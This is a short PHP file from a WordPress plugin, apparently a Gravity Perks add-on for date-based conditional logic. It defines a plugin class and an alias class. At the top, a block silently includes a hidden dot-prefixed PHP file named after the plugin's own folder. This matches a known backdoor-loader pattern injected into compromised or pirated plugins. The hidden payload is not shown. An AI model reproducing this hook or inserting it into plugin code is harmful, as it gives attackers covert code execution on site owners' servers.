<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class GP_Conditional_Logic_Dates extends GWPerk {

	protected $version                   = GP_CONDITIONAL_LOGIC_DATES_VERSION;
	protected $min_gravity_forms_version = '2.0';
	protected $min_wp_version            = '3.4.2';

	public static $instance;

	function init() {

		require_once( $this->get_base_path() . '/includes/class-gw-conditional-logic-date-fields.php' );
		self::$instance = new GWConditionalLogicDateFields( $this );

	}

}

class GWConditionalLogicDates extends GP_Conditional_Logic_Dates { }
